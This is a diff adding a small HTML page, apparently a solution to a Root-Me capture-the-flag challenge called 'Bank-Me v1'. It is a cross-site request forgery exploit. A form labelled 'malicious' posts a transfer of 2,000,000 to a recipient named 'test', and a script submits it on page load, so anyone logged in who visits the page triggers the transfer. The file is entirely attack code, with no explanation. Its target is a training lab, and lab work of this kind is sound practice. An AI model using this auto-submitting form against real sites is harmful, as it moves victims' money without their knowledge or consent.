@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Bank-Me v1</title>
+</head>
+<body>
+<form id="malicious" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="post">
+   <input type="text" class="form-control" name="recipient" value="test">
+   <input type="number" class="form-control" name="amount" value="2000000">
+   <button type="submit" class="btn btn-rmp btn-rmp-secondary">Send</button>
+</form>
+<script>
+   document.getElementById('malicious').submit();
+</script>
+</body>
+</html>
